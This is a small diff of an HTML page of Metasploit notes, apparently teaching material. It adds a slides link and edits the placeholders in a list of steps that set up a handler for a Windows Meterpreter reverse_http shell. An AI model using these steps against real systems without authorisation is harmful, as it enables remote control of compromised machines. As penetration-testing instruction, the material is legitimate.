@@ -3,6 +3,9 @@
   <br/>
 </div>
 
+<h4><a href="https://docs.google.com/presentation/d/1FN5lp1BmMC50iKv0Atp-tVLaKw6Q2IjRZ8m1_yLrcZ8/edit?usp=sharing">Slides</a></h4>
+<br>
+
 <h2>Metasploit commands:</h2>
 <h3>Shellcode generation:</h3>
 <ul>
@@ -14,7 +17,7 @@
 <li>msfconsole</li>
 <li>exploit/multi/handler</li>
 <li>set payload windows/x64/meterpreter/reverse_http</li>
-<li>set LHOST <Kali IP address></li>
-<li>set LPORT <non-standard port></li>
+<li>set LHOST <<IP address>IP Address></li>
+<li>set LPORT <<Port>Port></li>
 <li>run</li>
 </ol>
